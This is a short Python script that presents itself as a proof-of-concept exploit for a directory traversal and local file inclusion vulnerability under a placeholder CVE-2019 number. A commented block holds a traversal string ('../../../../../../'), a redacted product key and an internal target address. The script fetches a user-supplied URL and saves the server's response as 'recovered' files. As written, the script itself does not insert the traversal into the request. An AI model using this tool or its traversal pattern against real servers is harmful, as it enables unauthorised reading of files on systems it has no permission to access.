import argparse
import requests

"""
productkey = '[REDACTED]'
root_dir = '../../../../../../'
vuln_url = "http://10.0.0.167:[REDACTED]"
"""

print("[x] Proof of concept tool to exploit the directory traversal and local file"
      " inclusion vulnerability that resides in the [REDACTED]\n[x] CVE-2019-xxxxxx\n")

print("Example usage:\npython3 CVE-2019-xxxxxx-POC.py --url http://example:[REDACTED]")

parser = argparse.ArgumentParser()
parser.add_argument("--url", help='Specify the vulnerable URL')

args = parser.parse_args()

try:
    response = requests.get(args.url)
    file = open("output.txt", "w")
    file.write(response.text)
    file.close()
    print(response.text, "\n" * 5)
    print("Files succesfully recovered")

except Exception:
    print("[!] An error has occured")
